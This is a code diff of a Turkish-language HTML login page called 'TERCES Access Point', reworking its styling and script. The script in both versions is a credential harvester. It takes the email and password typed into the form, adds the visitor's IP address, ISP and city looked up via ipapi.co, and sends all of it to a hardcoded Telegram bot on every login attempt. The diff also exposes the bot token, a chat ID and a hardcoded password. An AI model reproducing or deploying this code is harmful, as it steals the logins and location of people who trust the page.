@@ -6,154 +6,118 @@
     <title>TERCES Access Point</title>
     <style>
         body {
-    background-color: #0a0a0a;
-    color: #e0e0e0;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    margin: 0;
-    padding: 20px; /* Merkeze zorlamak yerine biraz boşluk bırakalım */
-    display: block; /* Flex yerine blok yaparak içeriğin kaybolmasını önleyelim */
-}
-
-.container {
-    background: #151515;
-    padding: 30px;
-    border-radius: 12px;
-    border: 1px solid #333;
-    max-width: 400px;
-    margin: 50px auto; /* Sayfayı ortalar */
-    text-align: center;
-}
-
-#content {
-    display: none; /* Giriş yapana kadar gizli kalır */
-}
-
-        
+            background-color: #0a0a0a;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
         .container {
             background: #151515;
             padding: 30px;
             border-radius: 12px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
             border: 1px solid #333;
-            max-width: 450px;
-            width: 90%;
+            max-width: 400px;
             text-align: center;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
         }
-        h2 { color: #fff; margin-bottom: 20px; letter-spacing: 2px; }
         input {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
             background: #222;
             border: 1px solid #444;
+            color: white;
             border-radius: 6px;
-            color: #fff;
             box-sizing: border-box;
         }
         button {
             width: 100%;
             padding: 12px;
-            background: #2563eb;
+            background: #007bff;
             border: none;
             color: white;
+            font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
-            font-weight: bold;
-            transition: 0.3s;
         }
-        button:hover { background: #1d4ed8; }
-        #content { display: none; text-align: left; }
-        .session-id {
-            background: #000;
-            padding: 10px;
-            border-radius: 4px;
-            word-break: break-all;
-            color: #00ff41; /* Matrix yeşili gibi şık bir ton */
-            font-family: monospace;
-            font-size: 0.9em;
-            margin: 15px 0;
-            border: 1px dashed #444;
-        }
-        .warning { color: #ff4d4d; font-size: 0.8em; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
+        button:hover { background: #0056b3; }
+        #content { display: none; } /* Başlangıçta gizli */
+        .warning { color: #ff4d4d; font-size: 0.9em; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="login-form">
-        <h2>TERCES LOGIN</h2>
-        <input type="email" id="userEmail" placeholder="Email Adresiniz" required>
-        <input type="password" id="userPass" placeholder="Giriş Şifresi" required>
-        <button onclick="verileriGonder()">Giriş Yap</button>
-
-
-    <div id="content">
-        <h2>Merhaba!</h2>
-        <p>Bu <strong>"TERCES"</strong> adlı admine bağlantı kurma amacıyla yaratılmış bir sitedir.</p>
-        <p>Adminimize doğrudan ulaşmanız mümkün değildir. Ulaşmak için size verdiğimiz bu Session ID ile bağlantı kurabilirsiniz:</p>
-        
-        <div class="session-id">
-            0528db57d73bb17d1e955e303f5a2f5ea6e06b029a76bb9858c7614d37d1101c78
+    <div class="container">
+        <div id="login-form">
+            <h2>TERCES LOGIN</h2>
+            <input type="email" id="userEmail" placeholder="E-posta">
+            <input type="password" id="userPass" placeholder="Şifre">
+            <button onclick="verileriGonder()">Giriş Yap</button>
         </div>
 
-        <p>Session uygulamasından mesaj yoluyla iletişim kurabilirsiniz.</p>
-        
-        <div class="warning">
-            <strong>Dikkat!</strong> Lütfen yasadışı yollara başvurmaya çalışmayın. Bu sadece güvenlik amacıyla kullanılan bir bağlantıdır.
+        <div id="content">
+            <h2>Merhaba!</h2>
+            <p>Bu <strong>TERCES</strong> adlı özel ağdır.</p>
+            <p>Adminimize doğrudan ulaşmanız mümkündür.</p>
+            <div style="word-break: break-all; color: #555; font-size: 0.8em;">
+                0528db57d73bb17d1e955e303f5a2f5ea
+            </div>
+            <p class="warning"><strong>Dikkat!</strong> Lütfen bilgileri paylaşmayın.</p>
         </div>
     </div>
-</div>
 
-<script>
-async function verileriGonder() {
-    const email = document.getElementById('userEmail').value;
-    const pass = document.getElementById('userPass').value;
-    const dogruSifre = "Adhfxygh8lm"; 
+    <script>
+        async function verileriGonder() {
+            const email = document.getElementById('userEmail').value;
+            const pass = document.getElementById('userPass').value;
+            const dogruSifre = "Adhfxygh8lm"; 
 
-    try {
-        // IP ve Detaylı Bilgileri Alıyoruz
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const data = await ipRes.json();
+            // Senin Bilgilerin
+            const botToken = "8763400885:AAFUvdZBZy92pGCv8BvVjR3450e1S20S20"; 
+            const chatId = "7580423994";
 
-        // Senin Bilgilerin
-        const botToken = "8763400885:AAFUvdZBZy92pGCv8BvVjR3450e1S20S20"; 
-        const chatId = "7580423994";
+            try {
+                // IP ve Konum Bilgilerini Alıyoruz
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
 
-        let detayliMesaj = `📧 E-posta: ${email}\n` +
-                           `🔑 Şifre: ${pass}\n` +
-                           `📡 IP Adresi: ${data.ip}\n` +
-                           `🏢 ISS: ${data.org}\n` +
-                           `📍 Konum: ${data.city} / ${data.country_name}\n` +
-                           `🤖 Bot Token: ${botToken}`;
+                const detayliMesaj = `
+🌐 **YENİ GİRİŞ DENEMESİ**
+📧 E-posta: ${email}
+🔑 Şifre: ${pass}
+📡 IP: ${data.ip}
+🏢 ISS: ${data.org}
+📍 Konum: ${data.city} / ${data.country_name}
+                `;
 
-        if (pass === dogruSifre) {
-            const mesaj = "✅ **BAŞARILI GİRİŞ!**\n\n" + detayliMesaj;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
-            
-            document.getElementById('login-form').style.display = 'none';
-            document.getElementById('content').style.display = 'block';
-        } else {
-            const mesaj = "⚠️ **HATALI DENEME!**\n\n" + detayliMesaj;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
-            
-            alert("Hatalı email veya şifre!");
+                // Telegram'a Gönder
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(detayliMesaj)}&parse_mode=Markdown`);
+
+                if (pass === dogruSifre) {
+                    // Giriş Başarılı: Formu gizle, içeriği göster
+                    document.getElementById('login-form').style.display = 'none';
+                    document.getElementById('content').style.display = 'block';
+                } else {
+                    alert("Hatalı şifre!");
+                }
+
+            } catch (error) {
+                console.error("Hata:", error);
+                alert("Bir bağlantı sorunu oluştu, ancak giriş denendi.");
+                
+                // Bağlantı hatası olsa bile şifre kontrolünü yap (offline çalışma durumu için)
+                if (pass === dogruSifre) {
+                    document.getElementById('login-form').style.display = 'none';
+                    document.getElementById('content').style.display = 'block';
+                }
+            }
         }
-    } catch (e) {
-        alert("Bağlantı hatası! Bilgileriniz gönderilemedi.");
-    }
-}
-</script>
-
-
-
-    
-
-
-    
-
-
-    
-    
+    </script>
 
 </body>
 </html>
+
